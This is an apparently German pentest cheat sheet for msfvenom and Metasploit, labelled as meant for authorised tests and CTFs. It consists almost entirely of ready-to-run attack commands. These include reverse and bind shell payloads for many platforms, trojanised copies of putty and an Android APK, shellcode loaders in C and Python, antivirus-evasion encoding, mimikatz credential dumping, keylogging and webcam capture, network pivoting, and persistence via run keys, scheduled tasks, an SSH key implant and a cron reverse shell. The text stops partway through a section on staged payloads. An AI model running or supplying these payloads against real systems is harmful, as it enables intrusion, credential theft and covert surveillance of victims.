# MSFVenom Payloads & Listener - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.


Basic reverse shell - funktioniert mit nc msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell64_basic.exe # Dann catching mit: nc -nvlp 4444

---

## Inhaltsverzeichnis
1. [MSFVenom Grundlagen](#msfvenom-grundlagen)
2. [Windows Payloads](#windows-payloads)
3. [Linux Payloads](#linux-payloads)
4. [macOS Payloads](#macos-payloads)
5. [Web Payloads](#web-payloads)
6. [Mobile Payloads](#mobile-payloads)
7. [Scripting Payloads](#scripting-payloads)
8. [Shellcode & Raw Payloads](#shellcode--raw-payloads)
9. [Encoder & Evasion](#encoder--evasion)
10. [Listener Setup](#listener-setup)
11. [Meterpreter Basics](#meterpreter-basics)
12. [Meterpreter Post-Exploitation](#meterpreter-post-exploitation)
13. [Meterpreter Pivoting](#meterpreter-pivoting)
14. [Meterpreter Persistence](#meterpreter-persistence)
15. [Multi/Handler Advanced](#multihandler-advanced)
16. [Staged vs Stageless](#staged-vs-stageless)
17. [Payload Customization](#payload-customization)
18. [AV Evasion Techniken](#av-evasion-techniken)
19. [Alternative Shells](#alternative-shells)
20. [Payload Delivery Methods](#payload-delivery-methods)

---

## MSFVenom Grundlagen

### 1. MSFVenom Syntax
```bash
# Basic Syntax
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>

# List all payloads
msfvenom --list payloads
msfvenom --list payloads | grep windows
msfvenom --list payloads | grep meterpreter

# List formats
msfvenom --list formats

# List encoders
msfvenom --list encoders

# List platforms
msfvenom --list platforms

# List architectures
msfvenom --list archs

# Payload options
msfvenom -p <PAYLOAD> --list-options

# Help
msfvenom -h
```

### 2. Wichtige Parameter
```bash
-p, --payload    # Payload auswählen
-f, --format     # Output format (exe, elf, raw, etc.)
-o, --out        # Output file
-e, --encoder    # Encoder verwenden
-i, --iterations # Encoding iterations
-b, --bad-chars  # Bad characters to avoid
-a, --arch       # Architecture (x86, x64)
--platform       # Platform (windows, linux, etc.)
-s, --space      # Maximum payload size
-n, --nopsled    # NOP sled length
-k, --keep       # Keep template behavior (inject payload)
-x, --template   # Custom executable template
```

### 3. Connection Types

#### Reverse Shell
**Beschreibung**: Opfer verbindet zurück zum Angreifer
```bash
# Vorteil: Umgeht Firewall (ausgehende Verbindung)
# Nachteil: Angreifer IP muss erreichbar sein
LHOST=attacker_ip
LPORT=attacker_port
```

#### Bind Shell
**Beschreibung**: Opfer öffnet Port, Angreifer verbindet sich
```bash
# Vorteil: Keine ausgehende Verbindung nötig
# Nachteil: Firewall blockiert oft eingehende Verbindungen
RHOST=victim_ip
LPORT=victim_port
```

#### Reverse HTTPS/HTTP
**Beschreibung**: Getarnt als normaler Web-Traffic
```bash
# Vorteil: Schwerer zu erkennen, umgeht viele Firewalls
# Nachteil: Komplexer Setup
```

---

## Windows Payloads

### 4. Windows Meterpreter (Reverse TCP)

#### x86 Staged
```bash
# Executable (.exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# Service Executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o service.exe

# MSI Installer
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o installer.msi
```

#### x64 Staged
```bash
# Executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell64.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell64.dll

# Service
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o service64.exe
```

#### Stageless (inline)
```bash
# x86
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell_stageless.exe

# x64
[[msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell64_stageless.exe]]
```
**Vorteile Stageless**: Funktioniert auch wenn Stage2 blockiert wird, größere Datei
**Vorteile Staged**: Kleinere initiale Payload, flexibler

### 5. Windows Meterpreter (Reverse HTTPS)
```bash
# x86 HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell_https.exe

# x64 HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell64_https.exe

# Stageless HTTPS
msfvenom -p windows/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell_https_stageless.exe

# HTTP (falls HTTPS Probleme macht)
msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.14.5 LPORT=80 -f exe -o shell_http.exe
```
**Vorteile**: Schwerer zu erkennen, sieht aus wie HTTPS Traffic
**Nachteile**: Etwas langsamer

### 6. Windows Shell (CMD/PowerShell)

#### CMD Reverse Shell
```bash
# Staged
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o cmd_shell.exe

# Stageless
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o cmd_shell_stageless.exe
```

#### PowerShell
```bash
# PowerShell Base64 encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1

# PowerShell reflection (fileless)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f psh-reflection -o shell_reflection.ps1

# PowerShell Command (one-liner)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd
```

### 7. Windows Bind Shell
```bash
# Meterpreter Bind
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# x64 Bind
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind64.exe

# CMD Bind
msfvenom -p windows/shell/bind_tcp LPORT=4444 -f exe -o cmd_bind.exe
```

### 8. Windows Format Varianten
```bash
# EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# VBA (für Makros)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f vba -o macro.vba

# VBA-EXE (Macro droppt EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f vba-exe -o macro_exe.vba

# VBS (Visual Basic Script)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f vbs -o shell.vbs

# HTA (HTML Application)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh -o shell.hta

# BAT (Batch File)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f bat -o shell.bat

# MSI (Installer)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o installer.msi

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1
```

### 9. Windows Template Injection
```bash
# Payload in legitimes EXE injizieren
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -x putty.exe -k -o putty_backdoor.exe

# x64 Template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -x notepad.exe -k -o notepad_backdoor.exe
```
**Vorteile**: Sieht aus wie legitime Software
**Nachteile**: Kann Template beschädigen

---

## Linux Payloads

### 10. Linux Meterpreter

#### x86
```bash
# Reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Stageless
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell_stageless.elf

# Reverse HTTPS
msfvenom -p linux/x86/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f elf -o shell_https.elf

# Bind TCP
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf
```

#### x64
```bash
# Reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell64.elf

# Stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell64_stageless.elf

# Reverse HTTPS
msfvenom -p linux/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f elf -o shell64_https.elf
```

### 11. Linux Shell Payloads
```bash
# x86 Shell
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o linux_shell.elf

# x64 Shell
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o linux64_shell.elf

# Shell Bind
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o linux_bind.elf
```

### 12. Linux Format Varianten
```bash
# ELF (Standard)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Bash Script
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.pl
```

---

## macOS Payloads

### 13. macOS Meterpreter
```bash
# x64 Reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f macho -o shell.macho

# Reverse HTTPS
msfvenom -p osx/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f macho -o shell_https.macho

# Shell Reverse
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f macho -o shell.macho
```

### 14. macOS Bind Shell
```bash
msfvenom -p osx/x64/meterpreter/bind_tcp LPORT=4444 -f macho -o bind.macho
```

---

## Web Payloads

### 15. ASP/ASPX (Windows IIS)
```bash
# ASP Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# ASPX Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# ASPX CMD Shell
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o cmd.aspx
```

### 16. JSP (Java/Tomcat)
```bash
# JSP Meterpreter
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# JSP mit Encoding
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -e x86/shikata_ga_nai -o shell_encoded.jsp
```

### 17. WAR (Java/Tomcat)
```bash
# WAR File (deploy auf Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# WAR mit anderem Namen
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o app.war
```

### 18. PHP
```bash
# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# PHP Stageless
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell_stageless.php

# PHP Reverse Shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell_php.php

# Fix PHP Tags (füge <?php hinzu wenn nötig)
echo "<?php" > shell_fixed.php
cat shell.php >> shell_fixed.php
```

---

## Mobile Payloads

### 19. Android (APK)
```bash
# Android Meterpreter
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -o shell.apk

# Android Reverse HTTPS
msfvenom -p android/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -o shell_https.apk

# Android Shell
msfvenom -p android/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -o shell_cmd.apk

# APK mit Custom Icon/Name
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x legitimate.apk -o backdoored.apk
```

### 20. iOS
```bash
# iOS nur über zusätzliche Frameworks (komplexer)
# Meist Social Engineering nötig
```

---

## Scripting Payloads

### 21. Python
```bash
# Python Reverse Shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py

# Python HTTPS
msfvenom -p python/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f raw -o shell_https.py

# Python Shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o simple_shell.py
```

### 22. Bash
```bash
# Bash Reverse Shell
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh

# Als One-Liner
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw
```

### 23. PowerShell
```bash
# PowerShell Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1

# PowerShell Command (One-liner)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd

# PowerShell Reflection (fileless)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f psh-reflection -o reflection.ps1

# Encoded PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -e cmd/powershell_base64 -o encoded.ps1
```

### 24. Perl
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.pl
```

### 25. Ruby
```bash
msfvenom -p ruby/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.rb
```

---

## Shellcode & Raw Payloads

### 26. Shellcode Formats
```bash
# C Format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# C# Format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f csharp

# Python Format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python

# Raw Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shellcode.bin

# Hex Format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hex

# Base64
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw | base64
```

### 27. Shellcode Injection (C Example)
```c
// shellcode.c
#include <windows.h>

unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89..."; // msfvenom output

int main() {
    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();
}

// Compile:
// x86_64-w64-mingw32-gcc shellcode.c -o shell.exe
```

### 28. Shellcode Injection (Python)
```python
# inject.py
import ctypes

shellcode = b"\xfc\xe8\x82\x00..."  # msfvenom output

ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
```

---

## Encoder & Evasion

### 29. Encoder verwenden
```bash
# Single Encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple Iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded10x.exe

# x64 Encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded64.exe
```

### 30. Verfügbare Encoder
```bash
# List Encoders
msfvenom --list encoders

# Beste Encoder:
# x86:
-e x86/shikata_ga_nai         # Polymorphic XOR Additive
-e x86/fnstenv_mov            # Variable-length Fnstenv
-e x86/jmp_call_additive      # Jump/Call XOR Additive

# x64:
-e x64/xor_dynamic            # Dynamic XOR
-e x64/zutto_dekiru           # Zutto Dekiru

# Generic:
-e generic/none               # No encoding
```

### 31. Bad Characters vermeiden
```bash
# Ohne \x00 (NULL Byte)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00' -f exe -o shell_no_null.exe

# Multiple bad chars
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell_clean.exe

# Für Buffer Overflow
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
```

### 32. Payload Obfuscation
```bash
# Mit Template + Encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x calc.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o obfuscated.exe

# NOP Sled hinzufügen
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -n 200 -f exe -o nop_shell.exe
```

---

## Listener Setup

### 33. Metasploit Multi/Handler

#### Basic Listener
```bash
# Metasploit starten
msfconsole -q

# Handler setup
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run

# Oder in einer Zeile
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
```

#### HTTPS Listener
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
run
```

#### Staged Payload Listener
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z
```
**ExitOnSession false**: Handler bleibt aktiv für mehrere Sessions
**-j**: Job im Hintergrund
**-z**: Session nicht direkt interaktiv starten

#### Multiple Listeners
```bash
# Listener 1
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j

# Listener 2
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 5555
set ExitOnSession false
exploit -j

# Jobs anzeigen
jobs
```

### 34. Resource Scripts
```bash
# listener.rc erstellen:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j

# Ausführen:
msfconsole -r listener.rc
```

### 35. Netcat Listener (für Shell Payloads)
```bash
# Basic Listener
nc -nlvp 4444

# Mit Output logging
nc -nlvp 4444 | tee shell.log

# Bind Shell (connect to victim)
nc <victim_ip> 4444

# Verbose
nc -nvlp 4444
```

### 36. Socat Listener
```bash
# Basic Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Verschlüsselt (SSL)
# Cert erstellen:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener:
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash

# Client connect:
socat - OPENSSL:10.10.14.5:4444,verify=0
```

### 37. PowerShell Listener
```powershell
# Simple TCP Listener (Windows Attacker)
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
```

---

## Meterpreter Basics

### 38. Meterpreter Session Grundlagen
```bash
# Sessions auflisten
sessions

# Session Interaktion
sessions -i 1

# Session Information
sessions -i 1 -v

# Session beenden
sessions -k 1

# Alle Sessions beenden
sessions -K

# Session upgraden
sessions -u 1  # Shell -> Meterpreter

# Background session
background
# oder: Ctrl+Z
```

### 39. Meterpreter Core Commands
```bash
# Help
help
?

# Sysinfo
sysinfo

# User Info
getuid

# Process ID
getpid

# Channel Info
channel -l

# Background session
background

# Exit
exit
quit
```

### 40. File System Navigation
```bash
# Aktuelles Verzeichnis (Remote)
pwd
getwd

# Aktuelles Verzeichnis (Local - Angreifer)
lpwd
getlwd

# Verzeichnis wechseln (Remote)
cd C:\\Users\\Administrator
cd /etc

# Verzeichnis wechseln (Local)
lcd /tmp

# Dateien auflisten (Remote)
ls
dir

# Dateien auflisten (Local)
lls

# Katze (Remote file ausgeben)
cat file.txt

# Datei suchen
search -f *.txt
search -f password.txt -d C:\\Users

# Download
download C:\\Users\\Admin\\Desktop\\file.txt /tmp/
download file.txt

# Upload
upload /tmp/exploit.exe C:\\Users\\Public\\
upload payload.exe

# Edit (nur mit Text Editor auf Angreifer-System)
edit C:\\file.txt
```

### 41. Process Management
```bash
# Prozesse auflisten
ps

# In anderen Prozess migrieren
migrate <PID>

# Best Practice: Migrate zu stabilem Prozess
ps -S explorer
migrate <explorer_PID>

# Automatische Migration
run post/windows/manage/migrate

# Prozess killen
kill <PID>

# Command ausführen
execute -f calc.exe
execute -f cmd.exe -i -H

# -f: File
# -i: Interactive
# -H: Hidden
# -a: Arguments
```

### 42. Network Commands
```bash
# IP Config
ipconfig
ifconfig

# Route Table
route

# Route hinzufügen (Pivoting)
route add 192.168.1.0 255.255.255.0 1

# ARP Cache
arp

# Netstat
netstat

# Port forwarding
portfwd add -l 3389 -p 3389 -r 192.168.1.100
portfwd list
portfwd delete -l 3389

# Socks Proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run

# Dann in proxychains.conf:
# socks4 127.0.0.1 1080
```

---

## Meterpreter Post-Exploitation

### 43. Credential Harvesting
```bash
# Hashdump (Local SAM)
hashdump

# LSA Secrets
lsa_dump_secrets

# Mimikatz (Kiwi Extension)
load kiwi
kiwi_cmd privilege::debug
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd sekurlsa::tickets
kiwi_cmd lsadump::sam
kiwi_cmd lsadump::secrets

# Alternative (ältere Versionen):
load mimikatz
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::logonPasswords full
```

### 44. Privilege Escalation
```bash
# Aktuelles Privilege Level
getuid
getprivs

# Local Exploit Suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC Bypass
use exploit/windows/local/bypassuac_injection
set SESSION 1
run

# Token Impersonation
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# SYSTEM werden (getsystem)
getsystem
# Versucht verschiedene Methoden:
# - Named Pipe Impersonation
# - Token Duplication
# - Named Pipe + Cmd
```

### 45. Keylogging
```bash
# Process für Keylogger auswählen
ps -S explorer.exe
migrate <PID>

# Keylogger starten
keyscan_start

# Keystrokes auslesen
keyscan_dump

# Keylogger stoppen
keyscan_stop
```

### 46. Screenshot & Webcam
```bash
# Screenshot
screenshot

# Screenshot mit Verzögerung
screenshot -v false -p output.jpeg

# Webcam Liste
webcam_list

# Webcam Snapshot
webcam_snap

# Webcam Stream
webcam_stream

# Webcam Chat (Video)
webcam_chat
```

### 47. Clipboard & Idle Time
```bash
# Idle Time (wie lange inaktiv)
idletime

# UI-Interaktion nur wenn idle < X
idletime
# Wenn < 300 (5 min)

# Mouse/Keyboard Control
use espia
screengrab
```

### 48. System Commands
```bash
# Shell öffnen
shell

# PowerShell
load powershell
powershell_shell

# Shutdown
shutdown
shutdown -r  # Reboot

# Reboot
reboot

# Registry
reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg setval -k HKLM\\... -v Name -d Data
reg enumkey -k HKLM\\Software
```

---

## Meterpreter Pivoting

### 49. Port Forwarding
```bash
# Local Port Forward
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# Connect zu lokalem Port:
rdesktop 127.0.0.1:3389

# Liste
portfwd list

# Delete
portfwd delete -l 3389

# Flush all
portfwd flush
```

### 50. Route Pivoting
```bash
# Route hinzufügen
route add 192.168.1.0 255.255.255.0 1
# 192.168.1.0/24 via Session 1

# Routes anzeigen
route print

# Route löschen
route delete 192.168.1.0 255.255.255.0 1

# Auto-Route (Post Module)
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
run

# Dann andere Module verwenden:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445,3389
run
```

### 51. Socks Proxy
```bash
# Background Meterpreter session
background

# Socks Proxy starten
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j

# Route via Session
route add 192.168.1.0 255.255.255.0 1

# Proxychains config (/etc/proxychains4.conf):
# socks4 127.0.0.1 1080

# Tools über Proxy nutzen:
proxychains nmap -sT -Pn 192.168.1.100
proxychains crackmapexec smb 192.168.1.0/24
```

### 52. SSH Pivoting
```bash
# SSH Credentials gefunden
# Port Forward über Meterpreter
portfwd add -l 2222 -p 22 -r 192.168.1.100

# SSH via Tunnel
ssh user@127.0.0.1 -p 2222

# Dynamic Port Forwarding via SSH
ssh -D 9050 user@127.0.0.1 -p 2222

# Dann Proxychains mit 9050
```

---

## Meterpreter Persistence

### 53. Persistence Module
```bash
# Exploit Persistence (deprecated aber funktioniert)
use exploit/windows/local/persistence
set SESSION 1
set LHOST 10.10.14.5
set LPORT 4445
run

# Persistence Service
use exploit/windows/local/persistence_service
set SESSION 1
run

# Registry Persistence
use exploit/windows/local/registry_persistence
set SESSION 1
run
```

### 54. Post Module Persistence
```bash
# Schedule Task
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH C:\\payload.exe
set STARTUP SYSTEM
run

# Via Meterpreter direkt
run persistence -X -i 60 -p 4445 -r 10.10.14.5
# -X: Autostart
# -i: Interval (seconds)
# -p: Port
# -r: IP
```

### 55. Manual Persistence Methods
```bash
# Scheduled Task erstellen (Meterpreter Shell)
shell
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru System

# Registry Run Key
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"

# Service erstellen
sc create WindowsUpdate binPath= "C:\payload.exe" start= auto
sc start WindowsUpdate

# Startup Folder
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### 56. SSH Backdoor (Linux)
```bash
# SSH Key hinzufügen
shell
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron Job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | crontab -
```

---

## Multi/Handler Advanced

### 57. Handler Optionen
```bash
use exploit/multi/handler

# Payload
set payload windows/meterpreter/reverse_tcp

# Connection Settings
set LHOST 0.0.0.0  # Listen auf allen Interfaces
set LPORT 4444

# Session Settings
set ExitOnSession false  # Multi-Session Support
set IgnoreUnknownPayloads true

# Timeout
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 604800  # 1 Woche

# Verbose
set VERBOSE true

# Auto-Migrate (zu stabilem Prozess)
set AutoRunScript multi_console_command -r /path/to/migrate.rc

# Auto-Commands nach Session
set InitialAutoRunScript post/windows/manage/migrate
```

### 58. Handler mit AutoRunScript
```bash
# migrate.rc erstellen:
run post/windows/manage/migrate
run post/multi/recon/local_exploit_suggester

# Handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set AutoRunScript multi_console_command -r /root/migrate.rc
exploit -j
```

### 59. Multi-Payload Handler
```bash
# handler.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 5555
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 10.10.14.5
set LPORT 6666
set ExitOnSession false
exploit -j

# Run:
msfconsole -r handler.rc
```

---

## Staged vs Stageless

### 60. Staged Payloads
**Format**: `<platform>/<arch>/<payload>/reverse_tcp`
```bash
# Beispiel
windows/meterpreter/reverse_tcp

# Funktionsweise:
# Stage 1 (Stager): Klein, verbindet und lädt Stage 2
